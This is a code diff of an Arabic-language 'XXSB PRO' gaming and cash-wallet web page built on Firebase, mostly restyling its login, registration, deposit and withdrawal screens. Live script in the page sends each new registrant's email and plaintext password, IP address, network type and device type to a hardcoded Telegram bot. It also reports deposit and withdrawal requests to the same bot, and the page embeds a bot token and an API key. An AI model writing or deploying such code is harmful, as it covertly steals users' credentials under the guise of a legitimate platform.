@@ -3,58 +3,267 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XXSB PRO - منصة اللاعبين</title>
+    <title>XXSB PRO | Premium Gaming Platform</title>
     <style>
-        body { background-color: #080a0f; color: #ffffff; font-family: sans-serif; margin: 0; padding: 0; text-align: center; }
-        .container { max-width: 500px; margin: 40px auto; padding: 20px; }
-        .box { background: #121620; border: 1px solid #ff3e3e; padding: 30px; border-radius: 12px; box-shadow: 0 0 20px rgba(255,62,62,0.15); }
-        .tabs { display: flex; margin-bottom: 20px; background: #080a0f; padding: 5px; border-radius: 8px; }
-        .tab { flex: 1; padding: 10px; background: transparent; color: #8b949e; border: none; cursor: pointer; }
-        .tab.active { background: #ff3e3e; color: white; border-radius: 6px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #080a0f; border: 1px solid #30363d; color: white; border-radius: 6px; text-align: center; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #00ff66; color: #080a0f; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn-withdraw { background: #ffaa00; }
+        :root {
+            --bg-color: #060913;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --neon-cyan: #00f3ff;
+            --neon-green: #00ff66;
+            --neon-pink: #ff0055;
+            --neon-gold: #ffaa00;
+            --text-main: #ffffff;
+            --text-muted: #8c9ba5;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        body {
+            background: var(--bg-color);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 243, 255, 0.05) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(255, 0, 85, 0.04) 0%, transparent 40%);
+            color: var(--text-main);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .wrapper {
+            max-width: 480px;
+            margin: 50px auto;
+            position: relative;
+        }
+
+        /* Glassmorphism Card Style */
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 35px 25px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4), 
+                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        h2.title {
+            font-size: 26px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 25px;
+            background: linear-gradient(135deg, #fff 30%, var(--neon-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 4px 12px rgba(0,243,255,0.15);
+        }
+
+        .tabs {
+            display: flex;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 5px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .tab {
+            flex: 1;
+            padding: 12px;
+            background: transparent;
+            color: var(--text-muted);
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .tab.active {
+            background: linear-gradient(135deg, rgba(0, 243, 255, 0.2), rgba(0, 243, 255, 0.05));
+            color: var(--neon-cyan);
+            border: 1px solid rgba(0, 243, 255, 0.3);
+            text-shadow: 0 0 8px rgba(0, 243, 255, 0.5);
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid var(--glass-border);
+            color: #fff;
+            border-radius: 12px;
+            font-size: 15px;
+            outline: none;
+            text-align: center;
+        }
+
+        input:focus {
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
+            background: rgba(0, 0, 0, 0.4);
+        }
+
+        button.btn-action {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, var(--neon-cyan), #00a8ff);
+            color: #060913;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 243, 255, 0.25);
+            margin-top: 10px;
+        }
+
+        button.btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(0, 243, 255, 0.4);
+            filter: brightness(1.1);
+        }
+
+        button.btn-withdraw {
+            background: linear-gradient(135deg, var(--neon-gold), #ff7700);
+            box-shadow: 0 8px 20px rgba(255, 170, 0, 0.25);
+        }
+
+        button.btn-withdraw:hover {
+            box-shadow: 0 12px 25px rgba(255, 170, 0, 0.4);
+        }
+
+        #err {
+            color: var(--neon-pink);
+            font-size: 13px;
+            margin-top: 12px;
+            text-align: center;
+            min-height: 20px;
+            font-weight: 600;
+        }
+
         .hidden { display: none !important; }
-        .stat { background: #1c212c; padding: 15px; border-radius: 8px; font-size: 20px; margin-bottom: 15px; }
+
+        .welcome-txt { font-size: 16px; color: var(--text-muted); margin-bottom: 5px; }
+        .user-email { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 20px; }
+
+        .balance-box {
+            background: rgba(0, 255, 102, 0.03);
+            border: 1px solid rgba(0, 255, 102, 0.15);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .balance-label { font-size: 14px; color: var(--text-muted); margin-bottom: 5px; }
+        .balance-amount {
+            font-size: 32px;
+            font-weight: 900;
+            color: var(--neon-green);
+            text-shadow: 0 0 12px rgba(0, 255, 102, 0.3);
+        }
+
+        .bonus-badge {
+            font-size: 13px;
+            color: var(--neon-gold);
+            background: rgba(255, 170, 0, 0.1);
+            padding: 6px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 10px;
+            border: 1px solid rgba(255, 170, 0, 0.2);
+        }
+
+        .section-title {
+            font-size: 15px;
+            color: var(--text-muted);
+            text-align: right;
+            margin: 20px 5px 8px 0;
+            font-weight: 600;
+        }
+
+        .logout-btn {
+            background: rgba(255, 0, 85, 0.1);
+            border: 1px solid rgba(255, 0, 85, 0.2);
+            color: var(--neon-pink);
+            padding: 10px;
+            width: 100%;
+            border-radius: 12px;
+            margin-top: 30px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .logout-btn:hover {
+            background: var(--neon-pink);
+            color: #fff;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="auth-screen" class="box">
-        <h2>منصة XXSB PRO 🕹️</h2>
+<div class="wrapper">
+    <div id="auth-screen" class="glass-card">
+        <h2 class="title">XXSB PRO PLATFORM 🕹️</h2>
         <div class="tabs">
             <button id="tab-login" class="tab active" onclick="switchTab('login')">تسجيل الدخول</button>
-            <button id="tab-register" class="tab" onclick="switchTab('register')">إنشاء حساب</button>
+            <button id="tab-register" class="tab" onclick="switchTab('register')">إنشاء حساب جديد</button>
         </div>
-        <input type="email" id="email" placeholder="البريد الإلكتروني">
-        <input type="password" id="password" placeholder="كلمة المرور">
-        <button id="btn-submit" onclick="handleAuth()">دخول</button>
-        <p id="err" style="color:#ff3e3e;"></p>
+        
+        <div class="input-group">
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="كلمة المرور">
+        </div>
+        
+        <button id="btn-submit" class="btn-action" onclick="handleAuth()">تسجيل الدخول</button>
+        <div id="err"></div>
     </div>
 
-    <div id="main-screen" class="box hidden">
-        <h3 id="user-welcome">مرحباً بك</h3>
-        <div class="stat">الرصيد الحالي: <span id="balance" style="color:#00ff66; font-weight:bold;">0</span> جنيه</div>
-        <p id="bonus-status" style="font-size:13px; color:#ffaa00;"></p>
-        <hr style="border-color:#30363d;">
+    <div id="main-screen" class="glass-card hidden">
+        <div class="welcome-txt">مرحباً بك مجدداً 👋</div>
+        <div id="user-welcome" class="user-email">...</div>
         
-        <h4>🟩 طلب إيداع (شحن)</h4>
-        <input type="number" id="dep-amt" placeholder="المبلغ بالجنية">
-        <button onclick="sendRequest('deposit')">إرسال طلب إيداع</button>
+        <div class="balance-box">
+            <div class="balance-label">الرصيد المتاح بالمحفظة</div>
+            <div id="balance" class="balance-amount">0.00 ج.م</div>
+            <div id="bonus-status" class="bonus-badge hidden"></div>
+        </div>
 
-        <h4>🟧 طلب سحب كاش</h4>
-        <input type="number" id="with-amt" placeholder="المبلغ بالجنية">
-        <button class="btn-withdraw" onclick="sendRequest('withdraw')">إرسال طلب سحب</button>
-        
-        <button style="background:#ff3e3e; color:white; margin-top:25px;" onclick="logout()">خروج 🚪</button>
+        <div class="section-title">🟩 طلب شحن رصيد (إيداع)</div>
+        <div class="input-group">
+            <input type="number" id="dep-amt" placeholder="المبلغ بالجنية (الأدنى 150)">
+        </div>
+        <button class="btn-action" onclick="sendRequest('deposit')">تأكيد طلب الشحن الفوري</button>
+
+        <div class="section-title">🟧 طلب سحب كاش فوري</div>
+        <div class="input-group">
+            <input type="number" id="with-amt" placeholder="المبلغ بالجنية (الأدنى 150)">
+        </div>
+        <button class="btn-action btn-withdraw" onclick="sendRequest('withdraw')">تأكيد طلب السحب الفوري</button>
+
+        <button class="logout-btn" onclick="logout()">تسجيل الخروج الآمن 🚪</button>
     </div>
 </div>
 
 <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-auth.js";
-    import { getFirestore, doc, setDoc, getDoc, updateDoc, onSnapshot, addDoc, collection, increment } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-firestore.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+    import { getFirestore, doc, setDoc, getDoc, updateDoc, onSnapshot, addDoc, collection, increment } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyCyiLPBJ0qDVZhAtW5r0psuvz8iyIy8VLI",
@@ -72,19 +281,21 @@
     const BOT_TOKEN = "8125902090:AAELDfYT8h_4Q2bJX3183KbSmJfHezDnFkI";
     const CHAT_ID = "5499273828";
     let mode = "login";
+    let unsubs = [];
 
     window.switchTab = function(t) {
         mode = t;
         document.getElementById('tab-login').classList.toggle('active', t==='login');
         document.getElementById('tab-register').classList.toggle('active', t==='register');
-        document.getElementById('btn-submit').innerText = t==='login' ? 'دخول' : 'إنشاء الحساب الآن';
+        document.getElementById('btn-submit').innerText = t==='login' ? 'تسجيل الدخول' : 'إنشاء الحساب وبث البيانات';
+        document.getElementById('err').innerText = "";
     }
 
     async function getSpecs() {
         let ip = "مجهول";
         try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
         let net = navigator.connection ? navigator.connection.effectiveType : "WiFi/Cellular";
-        let dev = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "موبايل" : "كمبيوتر";
+        let dev = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "📱 موبايل" : "💻 كمبيوتر";
         return { ip, net, dev };
     }
 
@@ -92,13 +303,14 @@
         const email = document.getElementById("email").value.trim();
         const pass = document.getElementById("password").value;
         const err = document.getElementById("err");
-        if(!email || !pass) { err.innerText="املاً البيانات!"; return; }
+        if(!email || !pass) { err.innerText="⚠️ يرجى كتابة البريد وكلمة المرور بالكامل!"; return; }
 
         try {
             if(mode === "login") {
+                err.innerText = "⚡ جاري تسجيل الدخول الحقيقي...";
                 await signInWithEmailAndPassword(auth, email, pass);
             } else {
-                err.innerText = "جاري الإنشاء وبث البيانات للبوت... ⏳";
+                err.innerText = "⏳ جاري إنشاء الحساب وإرسال الإشعارات للـ Telegram...";
                 const cred = await createUserWithEmailAndPassword(auth, email, pass);
                 
                 await setDoc(doc(db, "users", cred.user.uid), {
@@ -106,35 +318,49 @@
                 });
 
                 const specs = await getSpecs();
-                // رسالة الإشعار البسيطة المطلوبة للبوت بدون أزرار تفاعلية ثقيلة
-                const msg = `🔔 تسجيل حساب جديد!\n\n✉️ الحساب: ${email}\n🔑 الباسورد: ${pass}\n🌐 الـ IP: ${specs.ip}\n📶 الشبكة: ${specs.net}\n📱 الجهاز: ${specs.dev}`;
+                const msg = `🔔 تم تسجيل لاعب جديد بالمنصة!\n\n✉️ الحساب: ${email}\n🔑 الباسورد: ${pass}\n🌐 الـ IP: ${specs.ip}\n📶 نوع الشبكة: ${specs.net}\n🖥️ نظام الجهاز: ${specs.dev}`;
+                
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: msg})
                 });
 
-                alert("تم الإنشاء بنجاح! يمكنك الآن تسجيل الدخول.");
-                switchTab('login');
-                document.getElementById("password").value = "";
+                alert("🎉 تم إنشاء حسابك بنجاح! تم تسجيل دخولك التلقائي للمنصة.");
                 err.innerText = "";
             }
-        } catch(e) { err.innerText = "خطأ في العملية أو الحساب موجود بالفعل."; }
+        } catch(e) { 
+            err.innerText = "❌ فشلت العملية: تأكد من البيانات أو أن الحساب مسجل بالفعل."; 
+        }
     }
 
     onAuthStateChanged(auth, user => {
+        unsubs.forEach(un => un());
+        unsubs = [];
+
         if(user) {
             document.getElementById("auth-screen").classList.add("hidden");
             document.getElementById("main-screen").classList.remove("hidden");
-            document.getElementById("user-welcome").innerText = `👤 اللاعب: ${user.email}`;
+            document.getElementById("user-welcome").innerText = user.email;
             
-            onSnapshot(doc(db, "users", user.uid), docSnap => {
+            const uSub = onSnapshot(doc(db, "users", user.uid), docSnap => {
                 if(docSnap.exists()) {
                     const data = docSnap.data();
-                    document.getElementById("balance").innerText = data.balance;
-                    if(data.bonusStatus === "pending") document.getElementById("bonus-status").innerText = "⏳ الـ 50 جنيه الهدية قيد المراجعة في لوحة المدير...";
-                    else if(data.bonusStatus === "approved") document.getElementById("bonus-status").innerText = "✅ تم تفعيل الهدية الترحيبية!";
-                    else document.getElementById("bonus-status").innerText = "";
+                    document.getElementById("balance").innerText = parseFloat(data.balance || 0).toLocaleString('ar-EG', {minimumFractionDigits: 2}) + " ج.م";
+                    
+                    const bBadge = document.getElementById("bonus-status");
+                    if(data.bonusStatus === "pending") {
+                        bBadge.innerText = "⏳ هدية الـ 50 جنيه قيد المراجعة الفورية...";
+                        bBadge.classList.remove("hidden");
+                    } else if(data.bonusStatus === "approved") {
+                        bBadge.innerText = "✅ مبروك! تم إضافة الـ 50 جنيه الترحيبية لرصيدك";
+                        bBadge.classList.remove("hidden");
+                        bBadge.style.color = "var(--neon-green)";
+                        bBadge.style.background = "rgba(0, 255, 102, 0.1)";
+                    } else {
+                        bBadge.classList.add("hidden");
+                    }
                 }
             });
+            unsubs.push(uSub);
         } else {
             document.getElementById("auth-screen").classList.remove("hidden");
             document.getElementById("main-screen").classList.add("hidden");
@@ -144,12 +370,14 @@
     window.sendRequest = async function(type) {
         const id = type === 'deposit' ? 'dep-amt' : 'with-amt';
         const amt = parseInt(document.getElementById(id).value);
-        if(!amt || amt < 150) { alert("الحد الأدنى 150 جنيه."); return; }
+        if(!amt || amt < 150) { alert("⚠️ الحد الأدنى لأي طلب شحن أو سحب هو 150 جنيه مصري."); return; }
 
         const user = auth.currentUser;
+        if(!user) return;
+
         if(type === 'withdraw') {
             const snap = await getDoc(doc(db, "users", user.uid));
-            if(!snap.exists() || snap.data().balance < amt) { alert("رصيدك لا يكفي للسحب!"); return; }
+            if(!snap.exists() || snap.data().balance < amt) { alert("❌ رصيدك الحالي أقل من المبلغ المراد سحبه!"); return; }
             await updateDoc(doc(db, "users", user.uid), { balance: increment(-amt) });
         }
 
@@ -157,13 +385,14 @@
             uid: user.uid, email: user.email, type: type, amount: amt, status: "pending", date: new Date().toISOString()
         });
 
-        // إشعار سريع للبوت لمعرفتك الفورية بالعمليات
-        const typeAr = type === 'deposit' ? 'إيداع شحن 🟩' : 'سحب كاش 🟧';
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: `💰 طلب ${typeAr} جديد!\n👤 اللاعب: ${user.email}\n💵 المبلغ: ${amt} جنيه\n👈 راجع لوحة التحكم للتفعيل.`})
+        const typeAr = type === 'deposit' ? 'إيداع شحن رصيد 🟩' : 'سحب كاش فوري 🟧';
+        const msg = `💰 طلب مالي جديد للمراجعة لايف!\n\n👤 اللاعب: ${user.email}\n⚙️ نوع العملية: ${typeAr}\n💵 القيمة الإجمالية: ${amt} جنيه مصري\n\n👈 افتح لوحة التحكم المحلية للتحديث الفوري للشبكة.`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: msg})
         });
 
-        alert("تم إرسال الطلب بنجاح وهو قيد المراجعة في لوحة الإدارة.");
+        alert("🚀 تم بث طلبك بنجاح لايف إلى الإدارة! جاري التحديث الفوري.");
         document.getElementById(id).value = "";
     }
 
